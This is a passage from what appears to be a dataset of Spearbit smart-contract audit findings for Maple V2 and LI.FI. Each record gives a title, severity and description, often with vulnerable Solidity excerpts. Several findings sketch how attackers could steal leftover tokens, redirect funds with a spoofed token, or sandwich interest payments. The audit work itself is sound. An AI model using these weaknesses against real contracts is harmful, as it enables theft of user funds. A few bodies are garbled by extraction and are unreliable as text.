Optimization"]}, {"title": "fullDaysLate computation can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The fullDaysLate computation can be optimized.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Users can prevent repossessed funds from being claimed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The DebtLocker.sol contract dictates an active liquidation by the following two conditions:  The _liquidator state variable is a non-zero address.  The current balance of the _liquidator contract is non-zero. If an arbitrary user sends 1 wei of funds to the liquidator's address, the borrower will be unable to claim repos- sessed funds as seen in the _handleClaimOfRepossessed() function. While the scope of the audit only covered the diff between v3.0.0 and v4.0.0-rc.0, the audit team decided it was important to include this as an informational issue. The Maple team will be addressing this in their V2 release.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "MEV whenever totalAssets jumps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "An attack users can try to capture large interest payments is sandwiching a payment with a deposit and a withdrawal. The current codebase tries to mostly eliminate this attack by:  Optimistically assuming the next interest payment will be paid back and accruing the interest payment linearly over the payment interval.  Adding a withdrawal period. However, there are still circumstances where the totalAssets increase by a large amount at once:  Users paying back their payment early. The jump in totalAssets will be the paymentAmount - timeE- lapsedSincePaymentStart / paymentInterval * paymentAmount.  Users paying back their entire loan early (closeLoan).  Late payments increase it by the late interest fees and the accrued interest for the next payment from its start date to now. 21", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Use ERCHelper approve() as best practice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The ERC20 approve function is being used by fundsAsset in fundLoan() to approve the max amount which does not check the return value.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification in removeLoanImpairment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Currently, if removeLoanImpairment is called after the loan's original due date, there will be no issues because the loan's removeLoanImpairment function will revert. It would be good to add a comment about this logic or duplicate the check explicitly in the loan manager. If the loan implementation is upgraded in the future to have a non-reverting removeLoanImpairment function, then the loan manager as-is would account for the interest incorrectly.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Can check msg.sender != collateralAsset/fundsAsset for extra safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Some old ERC tokens (e.g. the Sandbox's SAND token) allow arbitrary calls from the token address itself. This odd behavior is usually a result of implementing the ERC677 approveAndCall and transferAndCall functions incorrectly. With these tokens, it is technically possible for the low-level msg.sender.call(...) in the liquidator to be executing arbitrary code on one of the tokens, which could let an attacker drain the funds.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "IERC426 Implementation of preview and max functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "For the preview functions, EIP 4626 states: MAY revert due to other conditions that would also cause the deposit [mint/redeem, etc.] to revert. But the comments in the interface currently state: MUST NOT revert. In addition to the comments, there is the actual behavior of the preview functions. A commonly accepted interpreta- tion of the standard is that these preview functions should revert in the case of conditions such as protocolPaused, !active, !openToPublic totalAssets > liquidityCap etc. The argument basically states that the max functions should return 0 under such conditions and the preview functions should revert whenever the amount exceeds the max.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Set domainEnd correctly in intermediate _advanceGlobalPaymentAccounting steps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "pay- ments[paymentWithEarliestDueDate].paymentDueDate, which is possibly zero if the last payment has just been accrued past. This is currently not an issue, because in this scenario domainEnd would never be used before it is set back to its correct value in _updateIssuanceParams. However, for increased readability, it is recommended to prevent this odd intermediate state from ever occurring. domainEnd function, set to is", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Replace hard-coded value with PRECISION constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The constant PRECISION is equal to 1e30. The hard-coded value 1e30 is used in the _queueNext- Payment function, which can be replaced by PRECISION.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Use of floating pragma version", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Contracts should be deployed using a fixed pragma version. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager has low-level shares computation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager has low-level shares computation logic that should ideally only be in the ERC4626 Pool to separate the concerns.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Add additional checks to prevent refinancing/funding a closed loan", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "It's important that an already liquidated loan is not reused by refinancing or funding again as it would break a second liquidation when the second liquidator contract is deployed with the same arguments and salt.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager.removeLoanManager errors with out-of-bounds if loan manager not found", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager.removeLoanManager errors with an out-of-bounds error if the loan manager is not found.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "PoolManager.removeLoanManager does not clear loanManagers mapping", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The PoolManager.removeLoanManager does not clear the reverse loanManagers[mapleLoan] = loanManager mapping.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Pool._requestRedeem reduces the wrong approval amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The requestRedeem function transfers escrowShares_ from owner but reduces the approval by shares_. Note that in the current code these values are the same but for future PoolManager upgrades this could change.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Issuance rate for double-late claims does not need to be updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The previousRate_ for the 8c) case in claim is always zero because the payment (!onTimePayment_). The subtraction can be removed is late I'd suggest removing the subtraction here as it's confusing. The first payment's IR was reduced in _advanceGlob- alPaymentAccounting, the newly scheduled one that is also past due date never increased the IR.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification that paymentIdOf[loan_] is not 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Most functions in the loan manager use the value paymentIdOf[loan_] without first checking if it's the default value of 0. Anyone can pay off a loan at any time to cause the claim function to set paymentIdOf[loan_] to 0, so even the privileged functions could be front-run to call on a loan with paymentIdOf 0. This is not an issue in the current codebase because each function would revert for some other reasons, but it is recommended to add an explicit check so future upgrades on other modules don't make this into a more serious issue.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "LoanManager redundant check on late payment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "block.timestamp <= nextPaymentDueDate_ in one of the if statements. The payment is already known to be late at this point in the code, so block.timestamp > previousPaymentDueDate_ is always true.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Add encodeArguments/decodeArguments to WithdrawalManagerInitializer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "Unlike the other Initializers, the WithdrawalManagerInitializer.sol does not have public en- codeArguments/decodeArguments functions, and PoolDeployer need to be changed to use these functions cor- rectly", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Reorder WM.processExit parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "All other WM and Pool function signatures start with (uint256 shares/assets, address owner) parameters but the WM.processExit has its parameters reversed (address, uint256).", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Additional verification in MapleLoanInitializer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The MapleLoanInitializer could verify additional arguments to avoid bad pool deployments.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Clean up updatePlatformServiceFee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The updatePlatformServiceFee can be cleaned up to use an existing helper function", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Document restrictions on Refinancer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The refinancer may not set unexpected storage slots, like changing the _fundsAsset because _- drawableFunds, _refinanceInterest are still measured in the old fund's asset.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Typos / Incorrect documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The code and comments contain typos or are sometimes incorrect.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Informational"]}, {"title": "Receiver doesn't always reset allowance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function _swapAndCompleteBridgeTokens() of Receiver reset the approval to the executor at the end of an ERC20 transfer. However it there is insufficient gas then the approval is not reset. This allows the executor to access any tokens (of the same type) left in the Receiver. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { ... } else { // case 2: ERC20 asset ... token.safeIncreaseAllowance(address(executor), amount); if (reserveRecoverGas && gasleft() < _recoverGas) { token.safeTransfer(receiver, amount); ... return; // no safeApprove 0 } try executor.swapAndCompleteBridgeTokens{...} ... token.safeApprove(address(executor), 0); } }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: High Risk"]}, {"title": "CelerIMFacet incorrectly sets RelayerCelerIM as receiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "When assigning a bytes memory variable to a new variable, the new variable points to the same memory location. Changing any one variable updates the other variable. Here is a PoC as a foundry test function testCopy() public { Pp memory x = Pp({ a: 2, b: address(2) }); Pp memory y = x; y.b = address(1); assertEq(x.b, y.b); } Thus, when CelerIMFacet._startBridge() updates bridgeDataAdjusted.receiver, _bridgeData.receiver is implicitly updated too. This makes the receiver on the destination chain to be the relayer address. // case 'yes': bridge + dest call - send to relayer ILiFi.BridgeData memory bridgeDataAdjusted = _bridgeData; bridgeDataAdjusted.receiver = address(relayer); (bytes32 transferId, address bridgeAddress) = relayer .sendTokenTransfer{ value: msgValue }(bridgeDataAdjusted, _celerIMData); // call message bus via relayer incl messageBusFee relayer.forwardSendMessageWithTransfer{value: _celerIMData.messageBusFee}( _bridgeData.receiver, uint64(_bridgeData.destinationChainId), bridgeAddress, transferId, _celerIMData.callData );", "labels": ["Spearbit", "LIFI-retainer1", "Severity: High Risk"]}, {"title": "Max approval to any address is possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "HopFacetOptimized.setApprovalForBridges() can be called by anyone to give max approval to any address for any ERC20 token. Any ERC20 token left in the Diamond can be stolen. function setApprovalForBridges(address[] calldata bridges,address[] calldata tokensToApprove) external { ... LibAsset.maxApproveERC20(..., type(uint256).max); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: High Risk"]}, {"title": "Return value of low-level .call() not checked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Low-level primitive .call() doesn't revert in caller's context when the callee reverts. value is not checked, it can lead the caller to falsely believe that the call was successful. Receiver.sol uses .call() to transfer the native token to receiver. If receiver reverts, this can lead to locked ETH in Receiver contract.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: High Risk"]}, {"title": "Limits in LIFuelFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The facet LIFuelFacet is meant for small amounts, however, it doesn't have any limits on the funds sent. This might result in funds getting stuck due to insufficient liquidity on the receiving side. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { serviceFeeCollector.collectNativeGasFees{...}(...); } else { LibAsset.maxApproveERC20(...); serviceFeeCollector.collectTokenGasFees(...); ... } }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "The optimal version _depositAndSwap() isn't always used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function _depositAndSwap() of SwapperV2 has two versions. The second version keeps _- nativeReserve that is meant for fees. Several facets don't use this version although their bridge does require native fees. This could result in calls reverting due to insufficient native tokens left. function _depositAndSwap(...) ... // 4 parameter version /// @param _nativeReserve Amount of native token to prevent from being swept back to the caller function _depositAndSwap(..., uint256 _nativeReserve) ... // 5 parameter version", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "setContractOwner() is insufficient to lock down the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function transferOwnershipToZeroAddress() is meant to make the Diamond immutable. It sets the contract owner to 0. However, the contract owner can still be changed if there happens to be a pendingOwner. In that case confirmOwnershipTransfer() can still change the contract owner. function transferOwnershipToZeroAddress() external { // transfer ownership to 0 address LibDiamond.setContractOwner(address(0)); } function setContractOwner(address _newOwner) internal { DiamondStorage storage ds = diamondStorage(); address previousOwner = ds.contractOwner; ds.contractOwner = _newOwner; emit OwnershipTransferred(previousOwner, _newOwner); } function confirmOwnershipTransfer() external { Storage storage s = getStorage(); address _pendingOwner = s.newOwner; if (msg.sender != _pendingOwner) revert NotPendingOwner(); emit OwnershipTransferred(LibDiamond.contractOwner(), _pendingOwner); LibDiamond.setContractOwner(_pendingOwner); s.newOwner = LibAsset.NULL_ADDRESS; }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Receiver does not verify address from the originator chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The Receiver contract is designed to receive the cross-chain call from libDiamond address on the destination chain. However, it does not verify the source chain address. An attacker can build a malicious _- callData. An attacker can steal funds if there are left tokens and there are allowances to the Executor. Note that the tokens may be lost in issue: \"Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract\". And there may be allowances to Executor in issue \"Receiver doesn't always reset allowance\"", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The Receiver contract is designed to gracefully return the funds to users. It reserves the gas for recovering gas before doing swaps via executor.swapAndCompleteBridgeTokens. The logic of reserving gas for recovering funds is implemented at Receiver.sol#L236-L258 contract Receiver is ILiFi, ReentrancyGuard, TransferrableOwnership { // ... if (reserveRecoverGas && gasleft() < _recoverGas) { // case 1a: not enough gas left to execute calls receiver.call{ value: amount }(\"\"); // ... } // case 1b: enough gas left to execute calls try executor.swapAndCompleteBridgeTokens{ value: amount, gas: gasleft() - _recoverGas }(_transactionId, _swapData, assetId, receiver) {} catch { receiver.call{ value: amount }(\"\"); } // ... } 10 The gasleft() returns the remaining gas of a call. It is continuously decreasing. The second query of gasleft() is smaller than the first query. Hence, if the attacker tries to relay the transaction with a carefully crafted gas where gasleft() >= _recoverGas at the first quiry and gasleft() - _recoverGas reverts. This results in the token loss in the Receiver contract.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Use of name to identify a token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "startBridgeTokensViaCelerIM() uses the token name to identify cfUSDC token. Another token with the same name can pass this check. An attacker can create a scam token with the name \"cfUSDC\" and a function canonical() returning a legit ERC20 token address, say WETH. If this token is passed as _bridge- Data.sendingAssetId, CelerIMFacet will transfer WETH. 11 if ( keccak256( abi.encodePacked( ERC20(_bridgeData.sendingAssetId).symbol() ) ) == keccak256(abi.encodePacked((\"cfUSDC\"))) ) { // special case for cfUSDC token asset = IERC20( CelerToken(_bridgeData.sendingAssetId).canonical() ); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Unvalidated destination address in Gravity faucet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Data.destinationAddress address. The code does not validate if the provided destination address is in the valid bech32 format. there is an issue related to the validation of In the Gravity faucet, This can potentially cause issues when sending tokens to the destination address. If the provided address is not in the bech32 format, the tokens can be locked. Also, it can lead to confusion for the end-users as they might enter an invalid address and lose their tokens without any warning or error message. it is recommended to add a validation check for the _gravity-", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Hardcode or whitelist the Thorswap vault address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The issue with this code is that the depositWithExpiry function allows the user to enter any arbitrary vault address, which could potentially lead to a loss of tokens. If a user enters an incorrect or non-existent vault address, the tokens could be lost forever. There should be some validation on the vault address to ensure that it is a valid and trusted address before allowing deposits to be made to it.  Router 12 // Deposit an asset with a memo. ETH is forwarded, ERC-20 stays in ROUTER function deposit(address payable vault, address asset, uint amount, string memory memo) public payable nonReentrant{ ,! uint safeAmount; if(asset == address(0)){ safeAmount = msg.value; bool success = vault.send(safeAmount); require(success); } else { require(msg.value == 0, \"THORChain_Router: unexpected eth\"); // protect user from ,! accidentally locking up eth if(asset == RUNE) { safeAmount = amount; iRUNE(RUNE).transferTo(address(this), amount); iERC20(RUNE).burn(amount); } else { safeAmount = safeTransferFrom(asset, amount); // Transfer asset _vaultAllowance[vault][asset] += safeAmount; // Credit to chosen vault } } emit Deposit(vault, asset, safeAmount, memo); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Medium Risk"]}, {"title": "Check enough native assets for fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function _startBridge() of SquidFacet adds _squidData.fee to _bridgeData.minAmount. It has verified there is enough native asset for _bridgeData.minAmount, but not for _squidData.fee. So this could use native assets present in the Diamond, although there normally shouldn't be any native assets left. A similar issue occurs in:  CelerIMFacet  DeBridgeFacet function _startBridge(...) ... { ... uint256 msgValue = _squidData.fee; if (LibAsset.isNativeAsset(address(sendingAssetId))) { msgValue += _bridgeData.minAmount; } ... ... squidRouter.bridgeCall{ value: msgValue }(...); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "No check on native assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The functions startBridgeTokensViaHopL1Native() , startBridgeTokensViaXDaiBridge() and startBridgeTokensViaMultichain() don't check _bridgeData.minAmount <= msg.value. So this could use na- tive assets that are still in the Diamond, although that normally shouldn't happen. This might be an issue in combination with reentrancy. function startBridgeTokensViaHopL1Native(...) ... { _hopData.hopBridge.sendToL2{ value: _bridgeData.minAmount }( ... ); ... } function startBridgeTokensViaXDaiBridge(...) ... { _startBridge(_bridgeData); } function startBridgeTokensViaMultichain(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) LibAsset.depositAsset(_bridgeData.sendingAssetId,_bridgeData.minAmount); } // no check for native assets _startBridge(_bridgeData, _multichainData); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Missing doesNotContainDestinationCalls()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The functions startBridgeTokensViaLIFuel() and swapAndStartBridgeTokensViaLIFuel() doesn't have doesNotContainDestinationCalls(). function startBridgeTokensViaLIFuel(...) external payable nonReentrant refundExcessNative(payable(msg.sender)) doesNotContainSourceSwaps(_bridgeData) validateBridgeData(_bridgeData) { ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Race condition in _startBridge of LIFuelFacet.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "If the mapping for FEE_COLLECTOR_NAME hasn't been set up yet, then serviceFeeCollector will be address(0) in function _startBridge of LIFuelFacet. This might give unexpected results. function _startBridge(...) ... ( ... ServiceFeeCollector serviceFeeCollector = ServiceFeeCollector( LibMappings.getPeripheryRegistryMappings().contracts[FEE_COLLECTOR_NAME] ); ... } function getPeripheryContract(string calldata _name) external view returns (address) { return LibMappings.getPeripheryRegistryMappings().contracts[_name]; }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Sweep tokens from Hopfacets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The Hop bridges HopFacet and HopFacetOptimized don't check that _bridgeData.sendingAssetId is the same as the bridge token. So this could be used to sweep tokens out of the Diamond contract. Normally there shouldn't be any tokens left at the Diamond, however, in this version there are small amounts left: Etherscan LiFiDiamond.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Missing emit in _swapAndCompleteBridgeTokens of Receiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "In function _swapAndCompleteBridgeTokens the catch of ERC20 tokens does an emit, while the comparable catch of native assets doesn't do an emit. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { .. try ... {} catch { receiver.call{ value: amount }(\"\"); // no emit } ... } else { // case 2: ERC20 asset ... try ... {} catch { token.safeTransfer(receiver, amount); emit LiFiTransferRecovered(...); } } }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Spam events in ServiceFeeCollector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The contract ServiceFeeCollector has several functions that collect fees and are permissionless. This could result in spam events, which might confuse the processing of the events. function collectTokenGasFees(...) ... { ... emit GasFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeGasFees(...) ... { ... emit GasFeesCollected(LibAsset.NULL_ADDRESS, receiver, feeAmount); } function collectTokenInsuranceFees(...) ... { ... emit InsuranceFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeInsuranceFees(...) ... { ... emit InsuranceFeesCollected(LibAsset.NULL_ADDRESS,receiver,feeAmount); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Function depositAsset() allows 0 amount of native assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function depositAsset() disallows amount == 0 for ERC20, however it does allow amount == 0 for native assets. function depositAsset(address assetId, uint256 amount) internal { if (isNativeAsset(assetId)) { if (msg.value < amount) revert InvalidAmount(); } else { if (amount == 0) revert InvalidAmount(); ... } }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Inadequate expiration time check in ThorSwapFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "According to Thorchain, the expiration time for certain operations should be set to +60 minutes. How- ever, there is currently no check in place to enforce this requirement. This oversight may lead to users inadvertently setting incorrect expiration times, potentially causing unexpected behavior or issues within the ThorSwapFacet.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Insufficient validation of bridgedTokenSymbol and sendingAssetId", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "During the code review, It has been noticed that the facet does not adequately check the corre- spondence between the bridgedTokenSymbol and sendingAssetId parameters. This oversight could allow for a random token to be sent to the Diamond, while still bridging another available token within the Diamond, even when no tokens should typically be left in the Diamond.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Check for destinationChainId in CBridgeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Function _startBridge() of CBridgeFacet contains a check on destinationChainId and contains conversions to uint64. If both block.chainid and _bridgeData.destinationChainId) fit in an uint64 then the checks of modifier val- idateBridgeData are already sufficient. When _bridgeData.destinationChainId > type(uint64).max then this never reverts: if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); Then in the rest of the code it takes the truncated varion of the destinationChainId via uint64(_bridge- Data.destinationChainId), which can be any value, including block.chainid. So you can still bridge to the same chain. function _startBridge(ILiFi.BridgeData memory _bridgeData,CBridgeData memory _cBridgeData) private { if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); if (...) { cBridge.sendNative{ value: _bridgeData.minAmount }(... , ,! uint64(_bridgeData.destinationChainId),...); } else { ... cBridge.send(..., uint64(_bridgeData.destinationChainId), ...); } } modifier validateBridgeData(ILiFi.BridgeData memory _bridgeData) { ... if (_bridgeData.destinationChainId == block.chainid) { revert CannotBridgeToSameNetwork(); } ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Absence of nonReentrant in HopFacetOptimized facet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "HopFacetOptimized is a facet-based smart contract implementation that aims to optimize gas usage and streamline the execution of certain functions. It doesn't have the checks that other facets have: nonReentrant refundExcessNative(payable(msg.sender)) containsSourceSwaps(_bridgeData) doesNotContainDestinationCalls(_bridgeData) validateBridgeData(_bridgeData) Most missing checks are done on purpose to save gas. However, the most important check is the nonReentrant modifier. On several places in the Diamond it is possible to trigger a reentrant call, for example via ERC777 18 tokens, custom tokens, native tokens transfers. In combination with the complexity of the code and the power of ERC20Proxy.sol it is difficult to make sure no attacks can occur.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Revert for excessive approvals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Certain tokens, such as UNI and COMP, undergo a reversal if the value input for approval or transfer surpasses uint96. Both aforementioned tokens possess unique logic in their approval process that sets the allowance to the maximum value of uint96 when the approval amount equals uint256(-1). Note: Hop currently doesn't support these token so set to low risk.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Inconsistent transaction failure/stuck due to missing validation of global fixed native fee rate and execution fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The current implementation of the facet logic does not validate the global fixed native fee rate and execution fee, which can lead to inconsistent transaction failures or getting stuck in the process. This issue can arise when the fee rate is not set correctly or there are discrepancies between the fee rate used in the smart contract and the actual fee rate. This can result in transactions getting rejected or stuck, causing inconvenience to users and affecting the overall user experience.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Incorrect value emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "LibSwap.swap() emits the following emit AssetSwapped( transactionId, _swap.callTo, _swap.sendingAssetId, _swap.receivingAssetId, _swap.fromAmount, newBalance > initialReceivingAssetBalance // toAmount ? newBalance - initialReceivingAssetBalance : newBalance, block.timestamp ); It will be difficult to interpret the value emitted for toAmount as the observer won't know which of the two values has been emitted.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Storage slots derived from hashes are prone to pre-image attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Storage slots manually constructed using keccak hash of a string are prone to storage slot collision as the pre-images of these hashes are known. Attackers may find a potential path to those storage slots using the keccak hash function in the codebase and some crafted payload.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Incorrect arguments compared in SquidFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "startBridgeTokensViaSquid () reverts if (_squidData.sourceCalls.length > 0) != _bridge- Data.hasSourceSwaps. Here, _squidData.sourceCalls is an argument passed to Squid Router, and _bridge- Data.hasSourceSwaps refers to source swaps done by SquidFacet. Ideally, _bridgeData.hasSourceSwaps should be false for this function (though it's not enforced) which means _squidData.sourceCalls.length has to be 0 for it to successfully execute.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Unsafe casting of bridge amount from uint256 to uint128", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The issue with the code is that it performs an unsafe cast from a uint256 value to a uint128 value in the call to initiateTeleport() function. The _bridgeData.minAmount parameter passed to this function is of type uint256, but it is cast to uint128 without any checks, which may result in a loss of precision or even an overflow. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { 